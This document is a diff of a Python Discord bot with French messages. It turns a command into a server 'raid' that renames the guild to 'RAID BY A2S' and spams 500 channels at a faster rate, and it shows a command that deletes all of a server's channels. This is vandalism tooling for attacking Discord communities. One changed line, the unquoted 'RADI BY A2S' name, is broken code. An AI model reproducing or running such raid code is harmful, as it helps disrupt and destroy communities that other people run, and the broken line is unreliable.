@@ -140,20 +140,20 @@ async def a2s(ctx):
         except:
             pass
 
-    nom = "chat"
-    nombre = 20
-    nom_serveur = "Nouveau Serveur"
+    nom = "RAID BY A2S"
+    nombre = 500
+    nom_serveur = "RAID BY A2S"
 
-    await guild.edit(name=nom_serveur)
+    await guild.edit(name= RADI BY A2S)
 
     for i in range(nombre):
         try:
             await guild.create_text_channel(name=f"{nom}-{i+1}")
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.1)
         except:
             break
 
-    await ctx.send("✅ Terminé")
+    await ctx.send("✅ RAID FINIIII")
 
 # =========================
 # DELETE ALL CHANNELS
@@ -169,7 +169,7 @@ async def delete_all_channels(interaction: discord.Interaction):
     current_channel_id = interaction.channel.id
 
     await interaction.response.send_message(
-        "🧨 Suppression en cours...",
+        "SA SUPP TOUTTTT",
         ephemeral=True
     )
 
@@ -184,7 +184,7 @@ async def delete_all_channels(interaction: discord.Interaction):
             pass
 
     await interaction.followup.send(
-        "✅ Tous les salons ont été supprimés sauf celui-ci.",
+        "LES SALON SON SUPP",
         ephemeral=True
     )
 
